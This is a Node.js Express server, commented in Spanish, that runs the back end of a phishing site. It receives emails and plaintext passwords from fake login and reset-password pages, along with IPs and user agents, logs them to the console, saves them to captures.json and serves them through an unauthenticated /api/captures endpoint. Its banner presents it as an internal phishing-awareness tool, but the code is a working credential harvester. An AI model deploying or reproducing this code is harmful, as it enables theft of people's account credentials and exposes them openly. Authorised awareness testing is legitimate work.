const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 8080;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Servir archivos estáticos (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, '..')));

// API endpoint para recibir capturas
app.post('/api/submit', (req, res) => {
    try {
        const { email, password, timestamp, userAgent, url, type } = req.body;
        
        if (!email) {
            return res.status(400).json({ ok: false, message: 'Email requerido' });
        }

        const capture = {
            email: email,
            password: password || '(no proporcionada)',
            timestamp: timestamp || new Date().toLocaleString('es-ES'),
            userAgent: userAgent || req.headers['user-agent'] || 'unknown',
            url: url || req.headers.referer || 'unknown',
            type: type || 'login',
            ip: req.ip || req.connection.remoteAddress
        };

        console.log('\n═══════════════════════════════════════════');
        console.log('🚨 NUEVA CAPTURA RECIBIDA');
        console.log('═══════════════════════════════════════════');
        console.log('📧 Email:', capture.email);
        console.log('🔑 Password:', capture.password);
        console.log('🏷️  Tipo:', capture.type);
        console.log('⏰ Timestamp:', capture.timestamp);
        console.log('🌐 IP:', capture.ip);
        console.log('═══════════════════════════════════════════\n');

        // Guardar en archivo JSON
        const capturesFile = path.join(__dirname, 'captures.json');
        let allCaptures = [];
        
        if (fs.existsSync(capturesFile)) {
            try {
                const data = fs.readFileSync(capturesFile, 'utf8');
                allCaptures = JSON.parse(data);
            } catch (e) {
                console.error('Error leyendo captures.json:', e);
            }
        }
        
        allCaptures.push(capture);
        fs.writeFileSync(capturesFile, JSON.stringify(allCaptures, null, 2));
        
        console.log('✅ Captura guardada en captures.json');

        return res.json({ 
            ok: true, 
            message: 'Captura recibida y guardada',
            captureId: allCaptures.length 
        });

    } catch (error) {
        console.error('❌ Error procesando captura:', error);
        return res.status(500).json({ 
            ok: false, 
            message: 'Error del servidor' 
        });
    }
});

// Endpoint para obtener capturas (para el panel admin)
app.get('/api/captures', (req, res) => {
    try {
        const capturesFile = path.join(__dirname, 'captures.json');
        
        if (!fs.existsSync(capturesFile)) {
            return res.json([]);
        }

        const data = fs.readFileSync(capturesFile, 'utf8');
        const captures = JSON.parse(data);
        
        return res.json(captures);
    } catch (error) {
        console.error('Error leyendo capturas:', error);
        return res.status(500).json({ ok: false, message: 'Error del servidor' });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        captures: fs.existsSync(path.join(__dirname, 'captures.json')) 
            ? JSON.parse(fs.readFileSync(path.join(__dirname, 'captures.json'), 'utf8')).length 
            : 0
    });
});

// Página principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n╔════════════════════════════════════════════════╗');
    console.log('║   🚀 SERVIDOR DE PHISHING AWARENESS INICIADO  ║');
    console.log('╚════════════════════════════════════════════════╝');
    console.log(`\n📡 Servidor corriendo en:`);
    console.log(`   → http://localhost:${PORT}`);
    console.log(`   → http://127.0.0.1:${PORT}`);
    console.log(`\n📄 Páginas disponibles:`);
    console.log(`   → Login:          http://localhost:${PORT}/index.html`);
    console.log(`   → Reset Password: http://localhost:${PORT}/reset-password.html`);
    console.log(`   → Panel Admin:    http://localhost:${PORT}/admin.html`);
    console.log(`\n🔧 API Endpoints:`);
    console.log(`   → POST /api/submit   - Recibir capturas`);
    console.log(`   → GET  /api/captures - Ver capturas`);
    console.log(`   → GET  /api/health   - Health check`);
    console.log(`\n💾 Las capturas se guardan en: server/captures.json`);
    console.log(`\n⚠️  IMPORTANTE: Este servidor es solo para uso interno`);
    console.log(`   dentro de la red de tu empresa.\n`);
    
    // Obtener IP local
    const os = require('os');
    const interfaces = os.networkInterfaces();
    console.log('🌐 Otras IPs disponibles en tu red:');
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                console.log(`   → http://${iface.address}:${PORT}`);
            }
        }
    }
    console.log('\n' + '═'.repeat(50) + '\n');
});
